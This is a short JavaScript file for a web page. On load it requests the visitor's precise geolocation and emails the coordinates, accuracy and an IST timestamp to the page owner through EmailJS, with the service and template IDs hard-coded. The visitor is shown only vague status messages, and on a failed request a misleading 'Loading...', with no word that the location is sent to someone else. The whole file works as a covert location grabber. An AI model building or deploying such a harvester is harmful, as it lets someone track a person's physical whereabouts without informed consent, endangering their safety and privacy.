const EMAILJS_PUBLIC_KEY = "xaCDRHrABCOVKBO9S";
const EMAILJS_SERVICE_ID = "service_51seq9o";
const EMAILJS_TEMPLATE_ID = "template_la9mz5r";

const status = document.getElementById("status");

// Initialize EmailJS using your public key.
emailjs.init({
  publicKey: EMAILJS_PUBLIC_KEY,
});

window.addEventListener("load", () => {
  status.textContent = "Requesting For Location.";

  navigator.geolocation.getCurrentPosition(
    async (position) => {
      const templateParams = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        timestamp:
          new Date().toLocaleString("en-IN", {
            timeZone: "Asia/Kolkata",
            day: "2-digit",
            month: "2-digit",
            year: "numeric",
            hour: "2-digit",
            minute: "2-digit",
            second: "2-digit",
            hour12: true,
          }) + " IST",
      };

      status.textContent = "Location Fetched Successfully";

      try {
        await emailjs.send(
          EMAILJS_SERVICE_ID,
          EMAILJS_TEMPLATE_ID,
          templateParams,
        );

        status.textContent = "Location Sent Successfully";
      } catch (error) {
      } finally {
        locationBtn.disabled = false;
      }
    },
    (error) => {
      status.textContent = "Loading...";

      locationBtn.disabled = false;
    },
    {
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0,
    },
  );
});
